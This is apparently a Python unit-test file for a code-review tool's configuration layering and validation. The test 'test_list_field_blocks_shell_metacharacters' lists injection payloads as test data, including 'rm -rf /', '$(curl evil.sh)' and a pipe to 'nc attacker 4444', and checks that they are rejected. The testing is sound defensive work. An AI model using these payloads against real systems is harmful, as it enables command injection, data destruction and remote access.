"""Tests for lib/config.py — the config layering and validation gate.

This module is the trust boundary between a team's repo-owned
``.inhousecode/config.json`` and every downstream subprocess call the tool
makes (notably passing ``semgrepConfigs`` entries to `semgrep` on the shell).
A bug here either silently disables a security gate (a value fails to
validate the way the docs promise) or lets an attacker-controlled repo config
smuggle shell metacharacters into a subprocess argument. Both failure modes
are covered explicitly below, not just the happy path.
"""

from __future__ import annotations

import json
import sys
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
from helpers import load_module  # noqa: E402

config = load_module("config")


def defaults() -> dict:
    return {
        "static": {"enabled": True, "maxFixLoops": 20, "semgrepConfigs": ["p/python"]},
        "ai": {
            "enabled": True,
            "model": "",
            "timeoutSec": 600,
            "critiqueRounds": 2,
            "triageFindings": True,
        },
        "rulebook": ".inhousecode/developer-rulebook.md",
    }


class MergeTests(unittest.TestCase):
    def test_no_overrides_returns_defaults_unchanged(self):
        merged = config.merge(defaults(), {})
        self.assertEqual(merged, defaults())

    def test_override_updates_only_the_named_leaf(self):
        merged = config.merge(defaults(), {"static": {"enabled": False}})
        self.assertFalse(merged["static"]["enabled"])
        # Sibling keys in the same section must survive an untouched.
        self.assertEqual(merged["static"]["maxFixLoops"], 20)

    def test_unknown_top_level_key_is_a_hard_error(self):
        with self.assertRaisesRegex(config.ConfigError, "unknown configuration key: bogus"):
            config.merge(defaults(), {"bogus": True})

    def test_unknown_nested_key_is_a_hard_error(self):
        with self.assertRaisesRegex(
            config.ConfigError, "unknown configuration key: static.bogus"
        ):
            config.merge(defaults(), {"static": {"bogus": True}})

    def test_dollar_schema_key_is_silently_ignored(self):
        merged = config.merge(defaults(), {"$schema": "./review.config.schema.json"})
        self.assertEqual(merged, defaults())

    def test_scalar_where_object_expected_is_an_error(self):
        with self.assertRaisesRegex(config.ConfigError, "static must be an object"):
            config.merge(defaults(), {"static": "nope"})

    def test_renamed_key_folds_into_new_name(self):
        merged = config.merge(defaults(), {"ai": {"triageNits": False}})
        self.assertIn("triageFindings", merged["ai"])
        self.assertNotIn("triageNits", merged["ai"])
        self.assertFalse(merged["ai"]["triageFindings"])

    def test_old_and_new_renamed_key_together_is_an_error(self):
        # There is no sane precedence between the old and new spelling of the
        # same setting, so this must fail loudly rather than silently pick one.
        with self.assertRaisesRegex(config.ConfigError, "was renamed to ai.triageFindings"):
            config.merge(
                defaults(), {"ai": {"triageNits": False, "triageFindings": True}}
            )


class ValidateScalarTests(unittest.TestCase):
    def test_bool_field_rejects_non_bool(self):
        with self.assertRaisesRegex(config.ConfigError, "must be true or false"):
            config.validate_scalar(("static", "enabled"), True, "yes")

    def test_int_field_rejects_bool(self):
        # isinstance(True, int) is True in Python; the validator must not be
        # fooled by that into accepting a boolean as an integer field.
        with self.assertRaisesRegex(config.ConfigError, "must be an integer"):
            config.validate_scalar(("static", "maxFixLoops"), 20, True)

    def test_int_field_rejects_non_int(self):
        with self.assertRaisesRegex(config.ConfigError, "must be an integer"):
            config.validate_scalar(("static", "maxFixLoops"), 20, "5")

    def test_int_field_enforces_documented_upper_bound(self):
        # config.py:29 documents static.maxFixLoops as bounded [0, 20].
        with self.assertRaisesRegex(config.ConfigError, "must be between 0 and 20"):
            config.validate_scalar(("static", "maxFixLoops"), 20, 21)

    def test_int_field_enforces_documented_lower_bound(self):
        with self.assertRaisesRegex(config.ConfigError, "must be between 30 and 3600"):
            config.validate_scalar(("ai", "timeoutSec"), 600, 29)

    def test_int_field_accepts_boundary_values_inclusive(self):
        self.assertEqual(config.validate_scalar(("static", "maxFixLoops"), 20, 0), 0)
        self.assertEqual(config.validate_scalar(("static", "maxFixLoops"), 20, 20), 20)

    def test_int_field_without_explicit_bounds_uses_default_range(self):
        # ("agentStop", "unbounded") is not in INTEGER_BOUNDS, so it falls back
        # to the documented (0, 10_000) default rather than being unbounded.
        with self.assertRaisesRegex(config.ConfigError, "must be between 0 and 10000"):
            config.validate_scalar(("agentStop", "unbounded"), 5, 10_001)

    def test_string_field_rejects_control_characters(self):
        with self.assertRaisesRegex(config.ConfigError, "contains control characters"):
            config.validate_scalar(("ai", "model"), "", "gpt\x0b-eval")

    def test_string_field_accepts_plain_text(self):
        self.assertEqual(config.validate_scalar(("ai", "model"), "", "gpt-5.6-sol"), "gpt-5.6-sol")

    def test_list_field_rejects_non_string_items(self):
        with self.assertRaisesRegex(config.ConfigError, "must be an array of strings"):
            config.validate_scalar(("static", "semgrepConfigs"), ["p/python"], [1, 2])

    def test_list_field_rejects_empty_entry(self):
        with self.assertRaisesRegex(config.ConfigError, "unsafe entry"):
            config.validate_scalar(("static", "semgrepConfigs"), ["p/python"], [""])

    def test_list_field_blocks_shell_metacharacters(self):
        # semgrepConfigs entries are interpolated into a `semgrep --config`
        # subprocess call. A repo-owned config.json is a lower-trust input
        # than the tool's own defaults, so ";", "|", "$(", backticks, spaces,
        # etc. must never survive validation.
        dangerous = [
            "p/python; rm -rf /",
            "$(curl evil.sh)",
            "p/python`whoami`",
            "p/python && curl evil.sh",
            "p/python|nc attacker 4444",
        ]
        for entry in dangerous:
            with self.subTest(entry=entry):
                with self.assertRaisesRegex(config.ConfigError, "unsafe entry"):
                    config.validate_scalar(
                        ("static", "semgrepConfigs"), ["p/python"], [entry]
                    )

    def test_list_field_accepts_the_documented_safe_alphabet(self):
        safe = ["p/security-audit", "p/owasp-top-ten", "custom/team_rules-v1.2"]
        self.assertEqual(
            config.validate_scalar(("static", "semgrepConfigs"), ["p/python"], safe),
            safe,
        )

    def test_unsupported_default_type_raises(self):
        with self.assertRaisesRegex(config.ConfigError, "unsupported default type"):
            config.validate_scalar(("x", "y"), None, "anything")


class ShellNameTests(unittest.TestCase):
    def test_camel_case_becomes_upper_snake_case(self):
        self.assertEqual(
            config.shell_name(("static", "maxFixLoops")),
            "INHOUSECODE_STATIC_MAX_FIX_LOOPS",
        )

    def test_single_segment_path(self):
        self.assertEqual(config.shell_name(("rulebook",)), "INHOUSECODE_RULEBOOK")


class EmitTests(unittest.TestCase):
    def test_bool_true_renders_as_one(self):
        lines = config.emit({"static": {"enabled": True}})
        self.assertIn("INHOUSECODE_STATIC_ENABLED=1", lines)

    def test_bool_false_renders_as_zero(self):
        lines = config.emit({"static": {"enabled": False}})
        self.assertIn("INHOUSECODE_STATIC_ENABLED=0", lines)

    def test_list_renders_as_space_joined_shell_word(self):
        lines = config.emit({"static": {"semgrepConfigs": ["p/python", "p/security-audit"]}})
        self.assertIn(
            "INHOUSECODE_STATIC_SEMGREP_CONFIGS='p/python p/security-audit'", lines
        )

    def test_dollar_schema_is_never_emitted(self):
        lines = config.emit({"$schema": "./x.json", "rulebook": "x.md"})
        self.assertEqual(lines, ["INHOUSECODE_RULEBOOK=x.md"])

    def test_string_with_shell_metacharacters_is_still_safely_quoted(self):
        # emit() uses shlex.quote, so even a string that made it through
        # validate_scalar's control-character check must come out `eval`-safe.
        lines = config.emit({"rulebook": "a b$(c)`d`"})
        self.assertEqual(lines, ["INHOUSECODE_RULEBOOK='a b$(c)`d`'"])


class MainIntegrationTests(unittest.TestCase):
    def setUp(self):
        import tempfile

        self._tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        self.install_root = Path(self._tmp.name) / "install"
        self.repo_root = Path(self._tmp.name) / "repo"
        (self.install_root / "config").mkdir(parents=True)
        (self.repo_root / ".inhousecode").mkdir(parents=True)
        (self.install_root / "config" / "review.config.default.json").write_text(
            json.dumps(defaults())
        )

    def _run(self, argv, capsys_target="stdout"):
        import contextlib
        import io

        old_argv = sys.argv
        sys.argv = ["config.py", *argv]
        buf = io.StringIO()
        try:
            with contextlib.redirect_stdout(buf), contextlib.redirect_stderr(buf):
                exit_code = config.main()
        finally:
            sys.argv = old_argv
        return exit_code, buf.getvalue()

    def test_no_repo_config_emits_defaults_only(self):
        exit_code, out = self._run([str(self.install_root), str(self.repo_root)])
        self.assertEqual(exit_code, 0)
        self.assertIn("INHOUSECODE_STATIC_ENABLED=1", out)
        self.assertIn("INHOUSECODE_STATIC_MAX_FIX_LOOPS=20", out)

    def test_repo_config_overrides_are_applied(self):
        (self.repo_root / ".inhousecode" / "config.json").write_text(
            json.dumps({"static": {"maxFixLoops": 5}})
        )
        exit_code, out = self._run([str(self.install_root), str(self.repo_root)])
        self.assertEqual(exit_code, 0)
        self.assertIn("INHOUSECODE_STATIC_MAX_FIX_LOOPS=5", out)

    def test_repo_config_with_unknown_key_fails_closed(self):
        # A typo in a repo's config.json must be a hard error, not something
        # that silently no-ops and leaves a gate disabled without anyone
        # noticing (config.py:9-11).
        (self.repo_root / ".inhousecode" / "config.json").write_text(
            json.dumps({"static": {"enabld": False}})
        )
        exit_code, out = self._run([str(self.install_root), str(self.repo_root)])
        self.assertEqual(exit_code, 1)
        self.assertIn("unknown configuration key", out)

    def test_malformed_json_fails_closed_not_with_a_traceback(self):
        (self.repo_root / ".inhousecode" / "config.json").write_text("{not json")
        exit_code, out = self._run([str(self.install_root), str(self.repo_root)])
        self.assertEqual(exit_code, 1)
        self.assertIn("could not read repository configuration", out)

    def test_wrong_argument_count_is_a_usage_error(self):
        exit_code, out = self._run([str(self.install_root)])
        self.assertEqual(exit_code, 2)
        self.assertIn("usage:", out)


if __name__ == "__main__":
    unittest.main()
